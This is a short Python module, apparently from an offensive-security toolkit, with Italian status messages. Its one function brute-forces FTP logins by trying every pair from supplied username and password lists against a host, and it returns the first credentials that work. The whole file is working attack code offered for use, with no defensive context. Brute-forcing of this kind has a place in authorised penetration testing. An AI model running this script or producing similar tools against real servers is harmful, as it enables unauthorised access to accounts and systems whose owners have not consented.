# modules/brute_force/brute_force.py
from ftplib import FTP
import socket

def ftp_bruteforce(host, port, usernames, passwords):
    print(f"🚪 Tentativo di accesso FTP a {host}:{port}")
    for username in usernames:
        for password in passwords:
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(username, password)
                print(f"[✅] Credenziali trovate → {username}:{password}")
                ftp.quit()
                return username, password
            except Exception as e:
                print(f"[❌] Fallito → {username}:{password}")
    print("🔐 Nessuna credenziale valida trovata.")
    return None, None
